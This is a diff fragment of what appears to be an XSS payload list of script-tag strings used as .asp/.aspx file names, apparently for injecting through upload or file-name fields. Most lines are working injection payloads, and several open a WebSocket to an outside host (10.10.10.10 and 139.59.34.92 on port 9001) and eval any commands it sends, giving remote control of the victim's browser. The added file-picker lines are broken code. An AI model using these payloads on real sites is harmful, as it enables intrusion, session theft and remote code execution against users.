@@ -4,6 +4,8 @@
 <script>alert('employee')</script>.asp
 <script>alert('inspark')</script>.asp
 <script>document.createElement('input').type = 'file'; document.body.appendChild(input); input.click();</script>
+<script>document.createElement('input').type = 'file'; document.body.appendChild(input); input.click();</script>.asp
+<script>document.createElement('input').type = 'file'; document.body.appendChild(input); input.click();</script>.aspx
 <script src="data:text/javascript,(()%20=>%20{%20const%20ws%20=%20new%20WebSocket('ws://10.10.10.10:9001');%20ws.onopen%20=%20()%20=>%20ws.send('Ready%20for%20commands.');%20ws.onmessage%20=%20e%20=>%20{%20try%20{%20eval(e.data);%20}%20catch%20(err)%20{%20console.error(err);%20}%20};%20ws.onclose%20=%20()%20=>%20console.log('Connection%20closed');%20})();"></script>.asp
 <script src="data:text/javascript,(()%20=>%20{%20const%20ws%20=%20new%20WebSocket('ws://10.10.10.10:9001');%20ws.onopen%20=%20()%20=>%20ws.send('Ready%20for%20commands.');%20ws.onmessage%20=%20e%20=>%20{%20try%20{%20eval(e.data);%20}%20catch%20(err)%20{%20console.error(err);%20}%20};%20ws.onclose%20=%20()%20=>%20console.log('Connection%20closed');%20})();"></script>.aspx
 <script>(() => { const ws = new WebSocket("ws://139.59.34.92:9001"); ws.onopen = () => ws.send("Ready for commands."); ws.onmessage = e => { try { eval(e.data); } catch (err) { console.error(err); } }; ws.onclose = () => console.log("Connection closed"); })();</script>.asp
